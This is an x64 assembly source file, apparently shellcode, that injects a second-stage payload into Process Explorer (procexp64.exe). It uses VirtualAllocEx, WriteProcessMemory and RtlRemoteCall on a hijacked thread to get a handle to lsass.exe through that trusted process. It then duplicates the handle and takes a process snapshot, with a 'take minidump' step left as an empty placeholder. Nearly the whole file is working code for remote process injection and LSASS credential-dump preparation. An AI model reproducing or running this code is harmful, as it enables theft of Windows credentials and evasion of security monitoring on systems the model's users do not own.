[bits 64]

push r15
sub rsp, 8
call reloc_base

reloc_base:
    pop r15
    sub r15, 11

jmp main

; arg0: str1                    rcx
; arg1: str2                    rdx
;
; ret: 1 if equal               rax
utils_strcmp_aa:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx             ; str1
    mov [rbp + 24], rdx             ; str2

    ; rbp - 8 = return value
    ; rbp - 16 = rsi
    ; rbp - 24 = rdi
    ; rbp - 32 = 8 bytes padding
    sub rsp, 32                     ; allocate local variable space

    mov qword [rbp - 8], 0          ; return value
    mov [rbp - 16], rsi             ; save rsi
    mov [rbp - 24], rdi             ; save rdi

    mov rsi, [rbp + 16]             ; str1
    mov rdi, [rbp + 24]             ; str2

.loop:
    cmpsb
    jne .not_equal

    mov al, [rsi]                   ; cannot use lodsb since it incr esi
    cmp al, 0                       ; end of string ?
    je .equal

    jmp .loop

    .not_equal:
        mov qword [rbp - 8], 0      ; return value
        jmp .shutdown

    .equal:
        mov qword [rbp - 8], 1      ; return value
        jmp .shutdown

.shutdown:
    mov rdi, [rbp - 24]         ; restore rdi
    mov rsi, [rbp - 16]         ; restore rsi

    mov rax, [rbp - 8]          ; return value

    leave
    ret

; arg0: &target proc name          rcx
;
; ret: pid                  rax      
utils_find_target_pid_by_name:
        push rbp
        mov rbp, rsp

        mov [rbp + 16], rcx         ; &target proc name

        ; rbp - 8 = return value
        ; rbp - 16 = snapshot handle
        ; rbp - 324 = process entry struct
        ; rbp - 336 = padding bytes
        sub rsp, 336                ; local variable space
        sub rsp, 32                 ; shadow space

        mov qword [rbp - 8], -1     ; return value

        mov rcx, 0x2                ; TH32CS_SNAPPROCESS
        xor rdx, rdx
        call [r15 + params]         ; CreateToolhelp32Snapshot

        cmp rax, -1
        je .shutdown

        mov [rbp - 16], rax         ; snapshot handle
        mov dword [rbp - 324], 308  ; procesentry32.dwsize

        mov rcx, [rbp - 16]         ; snapshot handle
        mov rdx, rbp
        sub rdx, 324                ; &processentry
        call [r15 + params + 8]    ; Process32First

        cmp rax, 0
        je .shutdown

    .loop:
        mov rcx, [rbp - 16]         ; snapshot handle
        mov rdx, rbp
        sub rdx, 324                ; &processentry
        call [r15 + params + 16]    ; Process32Next

        cmp rax, 0
        je .loop_end
            mov rcx, [rbp + 16]      ; &target proc name
            mov rdx, rbp
            sub rdx, 280             ; proc name
            call utils_strcmp_aa

            cmp rax, 1               ; are strings equal
            je .process_found

            jmp .loop

    .process_found:
        mov rax, rbp
        sub rax, 324
        add rax, 8
        mov eax, [rax]
        mov [rbp - 8], rax          ; return value

    .loop_end:
    .shutdown:
        mov rcx, [rbp - 16]         ; snapshot handle
        call [r15 + params + 40]    ; CloseHandle

        mov rax, [rbp - 8]          ; return value

        leave
        ret

; arg0: target pid          rcx
;
; ret: target tid           rax
utils_find_target_tid:
        push rbp
        mov rbp, rsp

        mov [rbp + 16], rcx         ; target pid

        ; rbp - 8 = return value
        ; rbp - 16 = snapshot handle
        ; rbp - 44 = thread entry struct
        ; rbp - 48  = padding bytes
        sub rsp, 48                 ; local variable space
        sub rsp, 32                 ; shadow space

        mov qword [rbp - 8], -1     ; return value

        mov rcx, 0x4                ; TH32CS_SNAPTHREAD
        xor rdx, rdx
        call [r15 + params]         ; CreateToolhelp32Snapshot

        cmp rax, -1
        je .shutdown

        mov [rbp - 16], rax         ; snapshot handle
        mov dword [rbp - 44], 28    ; threadentry32.dwsize

        mov rcx, [rbp - 16]         ; snapshot handle
        mov rdx, rbp
        sub rdx, 44                 ; &threadentry
        call [r15 + params + 24]    ; Thread32First

        cmp rax, 0
        je .shutdown

    .loop:
        mov rcx, [rbp - 16]         ; snapshot handle
        mov rdx, rbp
        sub rdx, 44                 ; &threadentry
        call [r15 + params + 32]    ; Thread32Next

        cmp rax, 0
        je .loop_end
            mov rax, rbp
            sub rax, 32             ; threadentry32.th32OwnerthreadID
            mov eax, [rax] 
            cmp rax, [rbp + 16]     ; input pid == owner pid
            je .thread_found

            jmp .loop

    .thread_found:
        mov rax, rbp
        sub rax, 36                 ; threadentry32.th32ThreadID
        mov eax, [rax]
        mov [rbp - 8], rax          ; return value

    .loop_end:
    .shutdown:
        mov rcx, [rbp - 16]         ; snapshot handle
        call [r15 + params + 40]    ; CloseHandle

        mov rax, [rbp - 8]          ; return value

        leave
        ret

main:
        push rbp
        mov rbp, rsp

        ; rbp - 8 = return value
        ; rbp - 16 = procExp PID
        ; rbp - 24 = procExp TID
        ; rbp - 32 = procExp proc hnd
        ; rbp - 40 = procExp thread hnd
        ; rbp - 48 = procExp payload mem
        ; rbp - 56 = lsass proc id
        ; rbp - 64 = duplicated hnd
        ; shellcode params
        ; rbp - 72 = CloseHandle
        ; rbp - 80 = OpenProcess
        ; rbp - 88  = Sleep
        ; rbp - 96  = NtContinue
        ; rbp - 104 = 1 params to above funcs
        ; rbp - 112 = retVal
        ; rbp - 1344 = ntContinue ctx
        ; rbp - 1352 = pss snaphot handle
        ; rbp - 1360 = padding bytes
        sub rsp, 1360                       ; local variable space
        sub rsp, 64                         ; shadow space

        mov qword [rbp - 8], 0              ; return value

        ; find procExp PID
        mov rcx, r15
        add rcx, procExpStr
        call utils_find_target_pid_by_name

        cmp rax, -1
        je .shutdown

        mov [rbp - 16], rax                 ; procExp PID

        ; find procExp TID
        mov rcx, [rbp - 16]
        call utils_find_target_tid

        cmp rax, -1
        je .shutdown

        mov [rbp - 24], rax                 ; procExp TID

        ; open handle to procExp proc
        mov rcx, 0x1fFFFF                   ; PROCESS_ALL_ACCESS
        xor rdx, rdx
        mov r8, [rbp - 16]                  ; procExp PID
        call [r15 + params + 48]            ; openProcess

        cmp rax, 0
        je .shutdown

        mov [rbp - 32], rax                 ; procExp proc hnd

        ; open handle to procExp thread
        mov rcx, 0x1fFFFF                   ; THREAD_ALL_ACCESS
        xor rdx, rdx
        mov r8, [rbp - 24]                  ; procExp TID
        call [r15 + params + 56]            ; openThread

        cmp rax, 0
        je .shutdown

        mov [rbp - 40], rax                 ; procExp thread hnd

        ; set shellcode params
        ; suspend procExp thread
        mov rcx, [rbp - 40]                 ; procExp thread hnd
        call [r15 + params + 80]            ; suspendThread

        ; set ContextFlags
        mov dword [rbp - 1296], 0x10000B    ; CONTEXT_FULL

        ; get thread ctx
        mov rcx, [rbp - 40]                 ; procExp thread hnd
        mov rdx, rbp
        sub rdx, 1344                       ; ntContinue ctx
        call [r15 + params + 88]            ; getThreadContext

        ; set func addrs
        mov rax, [r15 + params + 40]        ; closeHandle
        mov [rbp - 72], rax

        mov rax, [r15 + params + 48]        ; openProcess 
        mov [rbp - 80], rax                 ; shellcode func

        mov rax, [r15 + params + 120]       ; sleep
        mov [rbp - 88], rax                 ; shellcode func

        mov rax, [r15 + params + 128]       ; ntContinue
        mov [rbp - 96], rax                 ; shellcode func

        mov rcx, r15
        add rcx, lsassStr
        call utils_find_target_pid_by_name

        cmp rax, -1
        je .shutdown

        mov [rbp - 56], rax                 ; lsass proc id

        ; set shellcode func params
        mov rax, [rbp - 56]                 ; lsass proc id
        mov [rbp - 104], rax                ; shellcode openProcess r8

        mov rax, 0xdeadbabe
        mov qword [rbp - 112], rax          ; shellcode retVal

        ; allocate mem for stage2 in procexp
        mov rcx, [rbp - 32]                 ; procExp proc hnd
        xor rdx, rdx
        mov r8, stage2_x64.len + 1280       ; shellcode + shellcode params
        mov r9, 0x3000                      ; MEM_RESERVE | MEM_COMMIT
        mov qword [rsp + 32], 0x40
        call [r15 + params + 64]            ; virtualAllocEx

        cmp rax, 0
        je .shutdown

        mov [rbp - 48], rax                 ; procExp payload mem

        ; write shellcode to procExp payload mem
        mov rcx, [rbp - 32]                 ; procExp proc hnd
        mov rdx, [rbp - 48]                 ; procExp payload mem
        mov r8, r15
        add r8, stage2_x64
        mov r9, stage2_x64.len
        mov qword [rsp + 32], 0
        call [r15 + params + 136]           ; writeProcessMemory

        cmp rax, 0
        je .shutdown

        ; write shellcode data to procExp payload mem
        mov rcx, [rbp - 32]                 ; procExp proc hnd
        mov rdx, [rbp - 48]                 ; procExp payload mem
        add rdx, stage2_x64.len
        mov r8, rbp
        sub r8, 1344                        ; shellcode params
        mov r9, 1288                        ; shellcode param size
        call [r15 + params + 136]           ; writeProcessMemory

        cmp rax, 0
        je .shutdown

        ; call RtlRemoteCall on the procexp mem
        mov rcx, [rbp - 32]                 ; procexp proc hnd
        mov rdx, [rbp - 40]                 ; procexp thread hnd
        mov r8, [rbp - 48]                  ; procexp payload mem
        xor r9, r9
        mov qword [rsp + 32], 0
        mov qword [rsp + 40], 1
        mov qword [rsp + 48], 1
        call [r15 + params + 96]            ; rtlRemoteCall

        ; resume procexp thread
        mov rcx, [rbp - 40]                 ; procexp thread hnd
        call [r15 + params + 104]           ; resumeThread

    .ret_val_loop:
        ; sleep for 1.5 secs before checking
        mov rcx, 1500
        call [r15 + params + 120]           ; sleep

        ; read the procexp retVal mem
        mov rcx, [rbp- 32]                  ; procexp proc hnd
        mov rdx, [rbp - 48]                 ; procexp payload mem
        add rdx, stage2_x64.len + 1232      ; retval offset
        mov r8, rbp
        sub r8, 112                         ; shellcode retval
        mov r9, 8
        mov qword [rsp + 32], 0
        call [r15 + params + 112]           ; readProcessMemory

        cmp dword [rbp - 112], 0xdeadbabe
        je .ret_val_loop

        cmp rax, 0
        je .shutdown

        ; duplicate handle
        mov rcx, [rbp - 32]                 ; procexp proc hnd
        mov rdx, [rbp - 112]                ; retVal
        mov r8, -1                          ; current proc pseudo hnd
        mov r9, rbp 
        sub r9, 64                          ; duplicated hnd
        mov qword [rsp + 32], 0
        mov qword [rsp + 40], 0
        mov qword [rsp + 48], 0x2           ; DUPLICATE_SAME_ACCESS

        call [r15 + params + 152]           ; duplicateHandle

        cmp rax, 0
        je .shutdown

        ; capture snapshot
        mov rcx, [rbp - 64]                 ; duplicated hnd
        mov rdx, 0x1                        ; PSS_CAPTURE_VA_CLONE
        xor r8, r8
        mov r9, rbp
        sub r9, 1352                        ; &SnapshotHandle
        call [r15 + params + 160]           ; pssCaptureSnapshot

        cmp rax, 0
        jne .shutdown

        ; take minidump

        ; free snapshot
        mov rcx, -1                         ; duplicated hnd
        mov rdx, [rbp - 1352]               ; snapshot hnd
        call [r15 + params + 168]           ; pssFreeSnapshot

    .shutdown:
        ; buffer time for remote ntcontinue
        mov rcx, 5000
        call [r15 + params + 120]           ; sleep

        ; free procExp mem
        mov rcx, [rbp - 32]                 ; procExp proc hnd
        mov rdx, [rbp - 48]                 ; procExp payload mem
        xor r8, r8
        mov r9, 0x8000                      ; MEM_RELEASE
        call [r15 + params + 72]            ; virtualFreeEx

        ; close duplicated hnd
        mov rcx, [rbp - 64]                 ; duplicated hnd
        call [r15 + params + 40]            ; closeHandle

        ; close procExp proc handle
        mov rcx, [rbp - 32]                 ; procExp proc hnd
        call [r15 + params + 40]            ; closeHandle

        ; close procExp thread hnd
        mov rcx, [rbp - 40]                 ; procExp thread hnd
        call [r15 + params + 40]            ; closeHandle

        mov rax, [rbp - 8]                  ; return value

        leave
        add rsp, 8
        pop r15
        ret

procExpStr: db 'procexp64.exe', 0
.len equ $ - procExpStr

lsassStr: db 'lsass.exe', 0
.len equ $ - lsassStr

align 16
%include 'stage2.x64.bin.asm'

align 16
params:
; createToolhelp32Snaphot  0
; process32First           8
; process32Next            16
; thread32First            24
; thread32Next             32
; closeHandle              40
; openProcess              48
; openThread               56
; virtualAllocEx           64
; virtualFreeEx            72
; suspendThread            80
; getThreadContext         88
; rtlRemoteCall            96
; resumeThread             104
; readProcessMemory        112
; sleep                    120
; ntContinue               128
; writeProcessMemory       136
; createRemoteThread       144
; duplicateHandle          152
; pssCaptureSnapshot       160
; pssFreeSnapshot          168